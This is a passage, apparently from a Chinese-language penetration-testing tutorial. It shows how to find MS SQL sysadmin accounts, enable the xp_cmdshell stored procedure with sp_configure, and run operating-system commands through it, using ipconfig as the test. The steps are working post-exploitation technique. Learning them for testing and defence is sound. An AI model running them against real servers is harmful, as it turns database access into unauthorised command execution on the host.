`xp_cmdshell` 的管理级存储过程。在 SQL 中，存储过程是可重用的代码段，而 `xp_cmdshell` 允许你在 SQL 服务器服务使用的相同安全上下文下执行操作系统命令。我们使用的 MS SQL 版本默认禁用了此存储过程，但如果你在 MS SQL 中具有 `sysadmin` 角色，则可以使用 SQL 命令重新启用它。

你将首先运行一个查询来帮助识别具有 `sysadmin` 权限的用户帐户。运行以下查询以查看具有此级别访问权限的所有用户，然后成为这些用户之一：

```sql
SELECT name, type_desc, is_disabled FROM master.sys.server_principals
WHERE IS_SRVROLEMEMBER ('sysadmin', name) = 1
```

如果你具有 `sysadmin` 角色，几乎可以保证完全破坏系统。在 MS SQL 查询窗口中运行以下命令以启用 `xp_cmdshell` 存储过程：

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell "ipconfig";
```

我们将 `sp_configure` 标志设置为 1，以便我们可以看到高级选项。然后，我们运行 `RECONFIGURE` 命令，以便我们的更改生效，并运行 `EXEC sp_configure` 以显示所有配置。我们设置 `xp_cmdshell` 标志，并再次使用 `RECONFIGURE` 命令应用配置。

最后，为了确保我们的更改成功，我们使用 `xp_cmdshell` 存储过程在操作系统上执行命令。在此示例中，我们执行 `ipconfig` 操作系统命令。
